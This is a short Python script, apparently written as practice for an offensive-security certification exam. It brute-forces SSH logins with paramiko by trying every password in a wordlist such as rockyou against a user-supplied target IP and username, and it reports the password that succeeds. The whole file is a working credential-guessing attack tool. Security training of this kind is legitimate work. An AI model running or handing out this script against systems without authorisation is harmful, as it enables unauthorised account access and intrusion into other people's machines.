#!/usr/bin/env python3
# Script By r0r0x
# Practice for the OSEP exam
#############################
# Install Requirements:
# pip3 install paramiko
# pip3 install termcolor

import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code

host = input('[+] Enter the ip address of the target: ')
username = input('[+] Enter the SSH Username: ')
input_file = input('[+] Enter the Passwords File (Rockyou) : ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] Hey wake up, That File / Path Doesnt Exist :D')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password YEAH! : ' + password + ' , For Account: ' + username), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login, try again!: ' + password)
            elif response == 2:
                print('[!!] Cant Connect, try again!')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass


